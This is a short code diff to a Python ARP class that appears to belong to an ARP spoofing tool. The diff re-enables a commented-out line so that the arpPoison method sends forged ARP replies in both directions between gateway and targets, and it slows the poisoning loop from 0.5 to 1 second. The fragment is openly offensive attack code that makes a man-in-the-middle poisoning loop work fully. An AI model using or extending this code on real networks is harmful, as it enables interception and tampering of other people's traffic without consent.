@@ -137,7 +137,7 @@ class ARP(threading.Thread):
     def arpPoison(self, src=None, dst=None):
         if (src != None and dst != None):
             sock = Sock().open_sock(self.iface)
-            #sock.send(str(self.buildPoison(src, dst)))
+            sock.send(str(self.buildPoison(src, dst)))
             sock.send(str(self.buildPoison(dst, src)))
             sock.close()
 
@@ -182,7 +182,7 @@ class ARP(threading.Thread):
             for target in self.targets:
                 #print "Poisoning %s  --- > %s"%(self.gateway.ip,target.ip)
                 self.arpPoison(self.gateway,target)
-                time.sleep(0.5)
+                time.sleep(1)
 
         
 
